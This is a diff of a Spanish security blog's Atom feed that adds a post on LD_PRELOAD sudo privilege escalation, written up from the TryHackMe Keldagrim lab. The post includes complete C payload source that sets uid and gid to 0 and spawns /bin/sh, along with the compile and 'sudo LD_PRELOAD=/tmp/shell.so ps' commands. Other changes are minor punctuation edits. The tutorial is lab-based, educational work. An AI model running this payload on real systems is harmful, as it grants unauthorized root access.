@@ -1,4 +1,48 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.9.0">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2021-04-28T16:14:01+02:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">El baúl de Diego</title><subtitle>Cybersecurity Enthusiast &amp; Geek</subtitle><author><name>Diego Martín dos Santos</name></author><entry><title type="html">Writeup: Tryhackme ColddBox.</title><link href="http://localhost:4000/2021/04/28/Writeup-coldbox.html" rel="alternate" type="text/html" title="Writeup: Tryhackme ColddBox." /><published>2021-04-28T00:00:00+02:00</published><updated>2021-04-28T00:00:00+02:00</updated><id>http://localhost:4000/2021/04/28/Writeup-coldbox</id><content type="html" xml:base="http://localhost:4000/2021/04/28/Writeup-coldbox.html">&lt;h1 id=&quot;enumeración&quot;&gt;Enumeración&lt;/h1&gt;
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.9.0">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2021-04-30T21:50:07+02:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">El baúl de Diego</title><subtitle>Cybersecurity Enthusiast &amp; Geek</subtitle><author><name>Diego Martín dos Santos</name></author><entry><title type="html">Explotación de la vulnerabilidad LD_PRELOAD Capabilties</title><link href="http://localhost:4000/2021/04/30/LD-PRELOAD.html" rel="alternate" type="text/html" title="Explotación de la vulnerabilidad LD_PRELOAD Capabilties" /><published>2021-04-30T00:00:00+02:00</published><updated>2021-04-30T00:00:00+02:00</updated><id>http://localhost:4000/2021/04/30/LD-PRELOAD</id><content type="html" xml:base="http://localhost:4000/2021/04/30/LD-PRELOAD.html">&lt;h1 id=&quot;situacion&quot;&gt;Situacion&lt;/h1&gt;
+&lt;p&gt;Me encontraba realizando la máquina Keldagrim de TryHackMe.
+Había conseguido acceso NO PRIVILEGIADO a la máquina víctima y no encontraba véctores de ataque para escalar privilegios, ahí fue cuando decídi usar “LINPEAS.SH” para automatizar la enumeración.&lt;/p&gt;
+
+&lt;p&gt;Entre otras cosas muchas, me enumeró que “env_keep+=LD_PRELOAD” tenía la capabilite para usarlo activada…(esto se puede ver supuestamente en “sudo -l”)&lt;/p&gt;
+
+&lt;p&gt;Anteriormente corrí “sudo -l” y también me enumeró que podía ejecutar “ps” como sudo sin contraseña. El binario de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ps&lt;/code&gt; no es explotable aunque tengas sudo, sin embargo, si puedes correr algun binario con sudo y tienes &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;LD_PRELOAD activado&lt;/code&gt; , puedes conseguir root.&lt;/p&gt;
+
+&lt;h1 id=&quot;explicación&quot;&gt;Explicación&lt;/h1&gt;
+
+&lt;p&gt;LD_PRELOAD es básicamente una forma de indicarle a programas C que librerías precargar para después ejecutar X programa.
+Por tanto, si creamos un payload en C compilado que nos estableza todos nuestro datos como root (GID,UID,ETC…) y le pedimos que lo precargue, para posteriormente ejecutarlo, el resultado será que ejecutará nuestro payload (una supuesta libreria C) como los permisos del programa X que indicamos antes.&lt;/p&gt;
+
+&lt;p&gt;Es decir:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  &lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;LD_PRELOAD&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/tmp/shell.so ps
+  &lt;span class=&quot;c&quot;&gt;#Podemos indicar sudo ya que este comando supuestamente solo va a ejecutar PS,&lt;/span&gt;
+  &lt;span class=&quot;c&quot;&gt;#el cúal podemos ejecutar como sudo.&lt;/span&gt;
+  &lt;span class=&quot;c&quot;&gt;#Por tanto y en resúmen, ejecutará &quot;ps&quot; como sudo y precargará la libreria(Payload)&lt;/span&gt;
+  &lt;span class=&quot;c&quot;&gt;#con los mismos permisos, es decir,SUDO. Por tanto, si el payload esta &lt;/span&gt;
+  &lt;span class=&quot;c&quot;&gt;#configurado correctamente, obtendremos permisos de root.&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;h1 id=&quot;creación-del-payload-recomiendo-hacer-todo-esto-en-tmp&quot;&gt;Creación del payload (recomiendo hacer todo esto en /tmp)&lt;/h1&gt;
+&lt;p&gt;Abrimos un editor de texto, añadimos el siguiente contenido y lo guardamos como shell.c&lt;/p&gt;
+&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;#include &amp;lt;stdio.h&amp;gt;
+#include &amp;lt;sys/types.h&amp;gt;
+#include &amp;lt;stdlib.h&amp;gt;
+&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;_init&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;unsetenv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;LD_PRELOAD&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;setgid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;setuid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;system&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/bin/sh&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Lo compilamos en un fichero llamado shell.so…&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;gcc &lt;span class=&quot;nt&quot;&gt;-fPIC&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-shared&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt; shell.so shell.c &lt;span class=&quot;nt&quot;&gt;-nostartfiles&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;y para finalizar, lo ejecutamos.&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;LD_PRELOAD&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/tmp/shell.so ps
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;Si todo ha salido bien, conseguiremos root.&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://www.hackingarticles.in/linux-privilege-escalation-using-ld_preload/&quot;&gt;Linux Privilege Escalation using LD_Preload&lt;/a&gt;&lt;/p&gt;</content><author><name>Diego Martín dos Santos</name></author><category term="ld,capabilities,explotacion,privesc" /><summary type="html">Situacion Me encontraba realizando la máquina Keldagrim de TryHackMe. Había conseguido acceso NO PRIVILEGIADO a la máquina víctima y no encontraba véctores de ataque para escalar privilegios, ahí fue cuando decídi usar “LINPEAS.SH” para automatizar la enumeración. Entre otras cosas muchas, me enumeró que “env_keep+=LD_PRELOAD” tenía la capabilite para usarlo activada…(esto se puede ver supuestamente en “sudo -l”)</summary></entry><entry><title type="html">Writeup: Tryhackme ColddBox.</title><link href="http://localhost:4000/2021/04/28/Writeup-coldbox.html" rel="alternate" type="text/html" title="Writeup: Tryhackme ColddBox." /><published>2021-04-28T00:00:00+02:00</published><updated>2021-04-28T00:00:00+02:00</updated><id>http://localhost:4000/2021/04/28/Writeup-coldbox</id><content type="html" xml:base="http://localhost:4000/2021/04/28/Writeup-coldbox.html">&lt;h1 id=&quot;enumeración&quot;&gt;Enumeración&lt;/h1&gt;
 &lt;p&gt;NMAP: Escaneo de puertos.&lt;/p&gt;
 
 &lt;p&gt;&lt;a href=&quot;https://ibb.co/sySrwwy&quot;&gt;&lt;img src=&quot;https://i.ibb.co/J5LP775/mmap1.png&quot; alt=&quot;mmap1&quot; border=&quot;0&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
@@ -109,7 +153,7 @@ Con &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sudo /bin
 &lt;p&gt;&lt;a href=&quot;https://ibb.co/gJv2w7V&quot;&gt;&lt;img src=&quot;https://i.ibb.co/3cf3Wsz/SMBCLIENT-CONECTARSRE.png&quot; alt=&quot;SMBCLIENT-CONECTARSRE&quot; border=&quot;0&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
 
 &lt;h1 id=&quot;enumeración-de-usuarios&quot;&gt;Enumeración de usuarios&lt;/h1&gt;
-&lt;p&gt;Con “impacket-GetNPUsers” (la opción más rapido con diferencia)&lt;/p&gt;
+&lt;p&gt;Con “impacket-GetNPUsers” (la opción más rapido con diferencia).&lt;/p&gt;
 
 &lt;p&gt;&lt;a href=&quot;https://ibb.co/RCwndZv&quot;&gt;&lt;img src=&quot;https://i.ibb.co/gDK1hHj/USER-ENUM.png&quot; alt=&quot;USER-ENUM&quot; border=&quot;0&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
 
@@ -317,7 +361,7 @@ En los usuarios puse todos los del fichero shadow que encontramos en el fichero 
 &lt;p&gt;&lt;a href=&quot;https://imgbb.com/&quot;&gt;&lt;img src=&quot;https://i.ibb.co/XjB9sdp/image.png&quot; alt=&quot;image&quot; border=&quot;0&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
 
 &lt;h1 id=&quot;agradecimientos&quot;&gt;Agradecimientos&lt;/h1&gt;
-&lt;p&gt;&lt;a href=&quot;https://www.youtube.com/watch?v=XtySdRYCbiY&quot;&gt;John Hammond (TryHackMe! Overpass 2 Recovering from THE HACK)&lt;/a&gt;&lt;/p&gt;</content><author><name>Diego Martín dos Santos</name></author><category term="tryhackme," /><category term="wireshark" /><summary type="html">Máquina TryHackMe: Overpass 2</summary></entry><entry><title type="html">Vulnerabilidad: Unquoted Service Path</title><link href="http://localhost:4000/2021/03/24/Unquoted-Service-Path.html" rel="alternate" type="text/html" title="Vulnerabilidad: Unquoted Service Path" /><published>2021-03-24T00:00:00+01:00</published><updated>2021-03-24T00:00:00+01:00</updated><id>http://localhost:4000/2021/03/24/Unquoted%20Service%20Path</id><content type="html" xml:base="http://localhost:4000/2021/03/24/Unquoted-Service-Path.html">&lt;h1 id=&quot;requisitos&quot;&gt;Requisitos&lt;/h1&gt;
+&lt;p&gt;&lt;a href=&quot;https://www.youtube.com/watch?v=XtySdRYCbiY&quot;&gt;John Hammond (TryHackMe! Overpass 2 Recovering from THE HACK)&lt;/a&gt;&lt;/p&gt;</content><author><name>Diego Martín dos Santos</name></author><category term="tryhackme," /><category term="wireshark" /><summary type="html">Máquina TryHackMe: Overpass 2</summary></entry><entry><title type="html">Vulnerabilidad: Unquoted Service Path</title><link href="http://localhost:4000/2021/03/24/Unquoted-Service-Path.html" rel="alternate" type="text/html" title="Vulnerabilidad: Unquoted Service Path" /><published>2021-03-24T00:00:00+01:00</published><updated>2021-03-24T00:00:00+01:00</updated><id>http://localhost:4000/2021/03/24/Unquoted%20Service%20Path</id><content type="html" xml:base="http://localhost:4000/2021/03/24/Unquoted-Service-Path.html">&lt;h1 id=&quot;requisitos&quot;&gt;Requisitos.&lt;/h1&gt;
 
 &lt;ul&gt;
   &lt;li&gt;Disponer de alguna forma de subir archivos , ya sea o bien teniendo una shell (Netcat, Meterpreter, etc…) o bien tener alguna forma de subir ficheros, ya sea RFI o LFI,o como sea que hayais vulnerado la máquina en la que quereís escalar privilegios.&lt;/li&gt;
@@ -404,4 +448,4 @@ Al crear servicios, si queremos que estos sean seguros, hay que jugar con los &l
 &lt;h1 id=&quot;agradecimientos&quot;&gt;Agradecimientos&lt;/h1&gt;
 &lt;p&gt;&lt;a href=&quot;https://medium.com/@SumitVerma101/windows-privilege-escalation-part-1-unquoted-service-path-c7a011a8d8ae&quot;&gt;Sumit Verma con su post “Windows Privilege Escalation — Part 1 (Unquoted Service Path)”&lt;/a&gt;&lt;/p&gt;
 
-&lt;p&gt;&lt;a href=&quot;https://hackmd.io/@EvilOrez/unquotedservices&quot;&gt;@EvilOrez con su Post “MICROSOFT’S UNQUOTED SERVICES”&lt;/a&gt;&lt;/p&gt;</content><author><name>Diego Martín dos Santos</name></author><category term="vulnerabilidad" /><summary type="html">Requisitos</summary></entry></feed>
+&lt;p&gt;&lt;a href=&quot;https://hackmd.io/@EvilOrez/unquotedservices&quot;&gt;@EvilOrez con su Post “MICROSOFT’S UNQUOTED SERVICES”&lt;/a&gt;&lt;/p&gt;</content><author><name>Diego Martín dos Santos</name></author><category term="vulnerabilidad" /><summary type="html">Requisitos.</summary></entry></feed>
